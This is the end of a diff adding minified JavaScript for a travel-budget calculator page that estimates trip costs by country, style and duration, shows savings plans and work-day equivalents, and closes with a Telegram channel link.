+h+=`<div class="st-card sl sl${i+1}${s}" onclick="style=${i};hp('light');r2()"><div class="st-emo">${SE[i]}</div><div style="flex:1"><div class="st-lbl">${t().sn[i]}</div><div class="st-desc">${t().snD[i]}</div></div>${pr}</div>`}
+h+=`</div><h3 style="font-size:15px;font-weight:700;margin-bottom:10px">${t().sd}</h3><div class="dur">`;
+[5,7,10,14,21].forEach(d=>{h+=`<button class="dbtn${days===d?' sel':''}" onclick="days=${d};hp('light');r2()">${d} ${t().days}</button>`});
+h+=`</div><div class="nav"><button class="nb" onclick="go(1)">← ${t().bk}</button><button class="nn" onclick="go(3)">${t().nx} →</button></div></div>`;$('s2').innerHTML=h}
+
+function r3(){let h=`<div class="sl"><h2 class="ttl">${t().sf}</h2><div class="opts">`;
+for(let i=0;i<4;i++){const s=foodS===i?' sel':'';const pr=country?`<div class="opt-pr">${fU(P[country].fd[i])}/${t().pd}</div>`:'';
+h+=`<div class="opt${s}" onclick="foodS=${i};hp('light');r3()"><div class="opt-emo">${FE[i]}</div><div class="opt-lbl">${t().sfn[i]}</div>${pr}</div>`}
+h+=`</div><h2 class="ttl">${t().su}</h2><div class="opts">`;
+for(let i=0;i<4;i++){const s=funS===i?' sel':'';const pr=country?`<div class="opt-pr">${fU(P[country].fn[i])}/${t().pd}</div>`:'';
+h+=`<div class="opt${s}" onclick="funS=${i};hp('light');r3()"><div class="opt-emo">${UE[i]}</div><div class="opt-lbl">${t().sun[i]}</div>${pr}</div>`}
+h+=`</div><div class="nav"><button class="nb" onclick="go(2)">← ${t().bk}</button><button class="nn" onclick="go(4)">${t().rs} →</button></div></div>`;$('s3').innerHTML=h}
+
+function r4(){const r=calc(country,style,days,foodS,funS);if(!r)return;const c=C.find(x=>x.id===country),ys=507*.6,sm=(r.total/ys).toFixed(1),tg2=tag(+sm),wd=Math.ceil(r.total/(ys/22));
+const lbs=[t().fl,t().ht,t().fd,t().fn,t().vi,t().ins],vals=[r.fl,r.ht,r.fd,r.fn,r.vi,r.ins],emos=["✈️","🏨","🍽️","🎡","📋","🛡️"];
+let h=`<div class="sl"><div class="res-hero"><div class="res-ctry">${c.f} ${c.n[L]} • ${days} ${t().days}</div>
+<div class="res-total">${fU(r.total)}</div><div class="res-uzs">≈ ${fS(r.total)} so'm</div>
+<div class="res-tag"><span style="font-size:18px">${tg2.e}</span><span style="font-weight:700;color:${tg2.c}">${tg2.l}</span><span style="color:var(--dim);font-size:11px">${sm} ${t().sal} (${t().yng})</span></div>
+<div class="res-wd">💼 <b>${wd}</b> ${t().wd}</div></div>
+<div class="bk">`;
+vals.forEach((v,i)=>{if(v<=0)return;const pct=(v/r.total*100).toFixed(0);
+h+=`<div class="bk-row"><span style="font-size:16px">${emos[i]}</span><span style="flex:1;font-size:12px">${lbs[i]}</span><div class="bk-bar"><div class="bk-fill" style="width:${pct}%;animation-delay:${i*.1}s"></div></div><span class="bk-val">${fU(v)}</span></div>`});
+h+=`</div><div class="sv"><div style="font-weight:700;font-size:13px">💰 ${t().sv}</div><div class="sv-grid">`;
+[10,15,20,30].forEach(p=>{const mo=ys*(p/100),ms=Math.ceil(r.total/mo);h+=`<div class="sv-item"><div style="font-size:10px;color:var(--dim)">${p}%</div><div class="sv-num">${ms}</div><div class="sv-lbl">${t().mo}</div></div>`});
+h+=`</div></div>`;const tip=TIPS[L][country];if(tip)h+=`<div class="tip"><div style="font-weight:700;font-size:12px;margin-bottom:4px">${t().tip}</div><div style="font-size:11px;color:var(--dim);line-height:1.5">${tip}</div></div>`;
+h+=ctaB()+`<div class="brow"><button class="bbtn" onclick="go(0)">🔄 ${t().re}</button><button class="bbtn" onclick="go(1)">🌍 ${t().oth}</button></div></div>`;
+$('s4').innerHTML=h;hp('success')}
+
+function r5(){$('prog').style.display='none';
+let h=`<div class="sl"><h2 class="ttl">${t().wt}</h2><p class="hint">${t().ws}</p>
+<div class="sal-row"><span class="sal-lbl">${t().wl}</span><input class="sal-in" type="number" value="${salary}" oninput="salary=+this.value;uW()"></div>
+<p style="font-size:10px;color:var(--muted);margin-bottom:16px">ℹ️ ${t().wn}</p><div id="wR"></div>${ctaB()}<div class="brow"><button class="bbtn" onclick="go(0)">← ${t().bk}</button></div></div>`;
+$('s5').innerHTML=h;uW()}
+
+function uW(){const d=salary/12580/22;let h='<div class="rv-grid">';
+C.forEach(c=>{const r=calc(c.id,1,7,1,1),wd=Math.ceil(r.total/d);let cls=wd>66?'rv-no':wd>44?'rv-mid':'rv-ok';
+h+=`<div class="rv ${cls}"><span class="rv-flag">${c.f}</span><span class="rv-name">${c.n[L]}</span><div class="rv-info"><div class="rv-num">${wd} ${t().wd}</div><div class="rv-det">${fU(r.total)} • 7${t().days}</div></div></div>`});
+h+='</div>';$('wR').innerHTML=h}
+
+function r6(){$('prog').style.display='none';
+let h=`<div class="sl"><h2 class="ttl">${t().rt}</h2><p class="hint">${t().rl}</p>
+<div class="sal-row"><span class="sal-lbl">${t().rl}</span><input class="sal-in" type="number" value="${budget}" oninput="budget=+this.value;uR()"></div>
+<p style="font-size:10px;color:var(--muted);margin-bottom:16px">ℹ️ ${t().rn}</p><div id="rR"></div>${ctaB()}<div class="brow"><button class="bbtn" onclick="go(0)">← ${t().bk}</button></div></div>`;
+$('s6').innerHTML=h;uR()}
+
+function uR(){const sorted=C.map(c=>{const p=P[c.id],dc=p.ht[1]+p.fd[1]+p.fn[1]+p.in,fc=p.fl[1]+p.vi,rem=budget-fc;return{...c,md:rem>0?Math.floor(rem/dc):0,dc,fc}}).sort((a,b)=>b.md-a.md);
+let h='<div class="rv-grid">';sorted.forEach(c=>{let cls=c.md>=7?'rv-ok':c.md>=3?'rv-mid':'rv-no',badge=c.md>=10?t().rgreat:c.md>=5?t().rok:c.md>=2?t().rtight:t().rno;
+h+=`<div class="rv ${cls}"><span class="rv-flag">${c.f}</span><span class="rv-name">${c.n[L]}</span><div class="rv-info"><div class="rv-num">${c.md>0?c.md+' '+t().rd:badge}</div><div class="rv-det">${t().fl}: ${fU(c.fc)} + ${fU(c.dc)}/${t().pd}</div></div></div>`});
+h+='</div>';$('rR').innerHTML=h}
+
+function ctaB(){return`<a href="https://t.me/nomadsclan" target="_blank" class="cta" style="margin-top:16px"><span class="cta-inner"><svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.492-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>${t().cta}</span></a><p class="cta-sub">${t().ctaS}</p>`}
+
+go(0);
+</script>
+</body>
+</html>
